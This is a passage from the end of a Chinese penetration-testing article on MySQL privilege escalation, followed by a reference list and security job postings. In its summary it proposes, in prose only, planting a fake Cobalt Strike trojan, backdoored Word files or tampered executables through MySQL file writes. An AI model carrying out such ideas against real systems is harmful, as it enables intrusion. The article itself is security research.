要想获取 root 权限得配合 CVE-2016-6662 与 CVE-2016-6664 这两个漏洞，但是我 CVE-2016-6664 漏洞复现失败了... 挖个坑，后续有机会再来总结，溜了溜了~~

_**No.8  
**_

_**总结**_

现在文章思路慢慢变成了 MySQL 可操控文件怎么将这个危害扩大影响的问题了。可以往管理员桌面上写一个伪造的 CS 木马，如果对方 Office 有漏洞的话可以写入一个带后门的 word 文件，也可以篡改用户常执行的文件等 这样发散开来就变的很广了，我这里不再一一叙述了，总之实际场景实际分析，大家在渗透的时候也可以多多思考更多的可能性，万一就成功了呢。

_**No.9  
**_

_**参考资料**_

**《网络攻防实战研究：漏洞利用与提权》**

https://book.douban.com/subject/30179595/

**先知 - Windows 下三种 mysql 提权剖析**

https://xz.aliyun.com/t/2719

**先知 - mysql 数据库漏洞利用及提权方式小结**

https://xz.aliyun.com/t/7392

**先知 - Mysql 提权 (CVE-2016-6663、CVE-2016-6664 组合实践)**

https://xz.aliyun.com/t/1122

**CSDN: Coisini - Linux MySQL Udf 提权**

https://blog.csdn.net/kclax/article/details/91515105?utm_medium=distribute.pc_relevant.none-task-blog-title-7&spm=1001.2101.3001.4242

**博客园：sijidou - udf 提权**

https://www.cnblogs.com/sijidou/p/10522972.html

**博客园：litlife - udf 提权原理详解**

https://www.cnblogs.com/litlife/p/9030673.html

**信安之路：Windows 提权系列中篇**

https://www.xazlsec.com/index.php/archives/260/

**WebShell.cc - Mysql UDF 提权**

https://www.webshell.cc/462.html

**Leticia's Blog - mysql 数据库提权总结**

http://next.uuzdaisuki.com/2018/07/02/mysql 数据库提权总结 /

**阿里云开发者社区 - MySQL 日志配置**

https://developer.aliyun.com/article/667096

_**招聘启事**_

安恒雷神众测 SRC 运营（实习生）  
————————  
【职责描述】  
1.  负责 SRC 的微博、微信公众号等线上新媒体的运营工作，保持用户活跃度，提高站点访问量；  
2.  负责白帽子提交漏洞的漏洞审核、Rank 评级、漏洞修复处理等相关沟通工作，促进审核人员与白帽子之间友好协作沟通；  
3.  参与策划、组织和落实针对白帽子的线下活动，如沙龙、发布会、技术交流论坛等；  
4.  积极参与雷神众测的品牌推广工作，协助技术人员输出优质的技术文章；  
5.  积极参与公司媒体、行业内相关媒体及其他市场资源的工作沟通工作。  
【任职要求】   
 1.  责任心强，性格活泼，具备良好的人际交往能力；  
 2.  对网络安全感兴趣，对行业有基本了解；  
 3.  良好的文案写作能力和活动组织协调能力。

简历投递至 

bountyteam@dbappsecurity.com.cn

设计师（实习生）

————————

【职位描述】  
负责设计公司日常宣传图片、软文等与设计相关工作，负责产品品牌设计。  
【职位要求】  
1、从事平面设计相关工作 1 年以上，熟悉印刷工艺；具有敏锐的观察力及审美能力，及优异的创意设计能力；有 VI 设计、广告设计、画册设计等专长；  
2、有良好的美术功底，审美能力和创意，色彩感强；精通 photoshop/illustrator/coreldrew / 等设计制作软件；  
3、有品牌传播、产品设计或新媒体视觉工作经历；  
【关于岗位的其他信息】  
企业名称：杭州安恒信息技术股份有限公司  
办公地点：杭州市滨江区安恒大厦 19 楼  
学历要求：本科及以上  
工作年限：1 年及以上，条件优秀者可放宽

简历投递至 

bountyteam@dbappsecurity.com.cn

安全招聘  
————————  
公司：安恒信息  
岗位：Web 安全 安全研究员  
部门：战略支援部  
薪资：13-30K  
工作年限：1 年 +  
工作地点：杭州（总部）、广州、成都、上海、北京

工作环境：一座大厦，健身场所，医师，帅哥，美女，高级食堂…  
【岗位职责】  
1. 定期面向部门、全公司技术分享;  
2. 前沿攻防技术研究、跟踪国内外安全领域的安全动态、漏洞披露并落地沉淀；  
3. 负责完成部门渗透测试、红蓝对抗业务;  
4. 负责自动化平台建设  
5. 负责针对常见 WAF 产品规则进行测试并落地 bypass 方案  
【岗位要求】  
1. 至少 1 年安全领域工作经验；  
2. 熟悉 HTTP 协议相关技术  
3. 拥有大型产品、CMS、厂商漏洞挖掘案例；  
4. 熟练掌握 php、java、asp.net 代码审计基础（一种或多种）  
5. 精通 Web Fuzz 模糊测试漏洞挖掘技术  
6. 精通 OWASP TOP 10 安全漏洞原理并熟悉漏洞利用方法  
7. 有过独立分析漏洞的经验，熟悉各种 Web 调试技巧  
8. 熟悉常见编程语言中的至少一种（Asp.net、Python、php、java）  
【加分项】  
1. 具备良好的英语文档阅读能力；  
2. 曾参加过技术沙龙担任嘉宾进行技术分享；  
3. 具有 CISSP、CISA、CSSLP、ISO27001、ITIL、PMP、COBIT、Security+、CISP、OSCP 等安全相关资质者；  
4. 具有大型 SRC 漏洞提交经验、获得年度表彰、大型 CTF 夺得名次者；  
5. 开发过安全相关的开源项目；  
6. 具备良好的人际沟通、协调能力、分析和解决问题的能力者优先；  
7. 个人技术博客；  
8. 在优质社区投稿过文章；

岗位：安全红队武器自动化工程师  
薪资：13-30K  
工作年限：2 年 +  
工作地点：杭州（总部）  
【岗位职责】  
1. 负责红蓝对抗中的武器化落地与研究；  
2. 平台化建设；  
3. 安全研究落地。  
【岗位要求】  
1. 熟练使用 Python、java、c/c++ 等至少一门语言作为主要开发语言；  
2. 熟练使用 Django、flask 等常用 web 开发框架、以及熟练使用 mysql、mongoDB、redis 等数据存储方案；  
3: 熟悉域安全以及内网横向渗透、常见 web 等漏洞原理；  
4. 对安全技术有浓厚的兴趣及热情，有主观研究和学习的动力；  
5. 具备正向价值观、良好的团队协作能力和较强的问题解决能力，善于沟通、乐于分享。  
【加分项】  
1. 有高并发 tcp 服务、分布式等相关经验者优先；  
2. 在 github 上有开源安全产品优先；  
3: 有过安全开发经验、独自分析过相关开源安全工具、以及参与开发过相关后渗透框架等优先；  
4. 在 freebuf、安全客、先知等安全平台分享过相关技术文章优先；  
5. 具备良好的英语文档阅读能力。

简历投递至 

bountyteam@dbappsecurity.com.cn

岗位：红队武器化 Golang 开发工程师  
薪资：13-30K  
工作年限：2 年 +  
工作地点：杭州（总部）  
【岗位职责】  
1. 负责红蓝对抗中的武器化落地与研究；  
2. 平台化建设；  
3. 安全研究落地。  
【岗位要求】  
1. 掌握 C/C++/Java/Go/Python/JavaScript 等至少一门语言作为主要开发语言；  
2. 熟练使用 Gin、Beego、Echo 等常用 web 开发框架、熟悉 MySQL、Redis、MongoDB 等主流数据库结构的设计, 有独立部署调优经验；  
3. 了解 docker，能进行简单的项目部署；  
3. 熟悉常见 web 漏洞原理，并能写出对应的利用工具；  
4. 熟悉 TCP/IP 协议的基本运作原理；  
5. 对安全技术与开发技术有浓厚的兴趣及热情，有主观研究和学习的动力，具备正向价值观、良好的团队协作能力和较强的问题解决能力，善于沟通、乐于分享。  
【加分项】  
1. 有高并发 tcp 服务、分布式、消息队列等相关经验者优先；  
2. 在 github 上有开源安全产品优先；  
3: 有过安全开发经验、独自分析过相关开源安全工具、以及参与开发过相关后渗透框架等优先；  
4. 在 freebuf、安全客、先知等安全平台分享过相关技术文章优先；  
5. 具备良好的英语文档阅读能力。  
简历投递至 

bountyteam@dbappsecurity.com.cn

![](https://mmbiz.qpic.cn/mmbiz_jpg/HxO8NorP4JU8KTRDias8PibAecVuiangc54Ez1Ur3pmCwf0umjQhUUNdt6DRxWiadCNmOMzBqibEghxUG71ZHSeGroA/640?wx_fmt=jpeg)

专注渗透测试技术

全球最新网络攻击技术

END

![](https://mmbiz.qpic.cn/mmbiz_jpg/HxO8NorP4JU8KTRDias8PibAecVuiangc5499PvetBuicaUMFcXyWlAdzlQp8ISllDuH0WgV8qYYIXrEoDQ8szQw9w/640?wx_fmt=jpeg)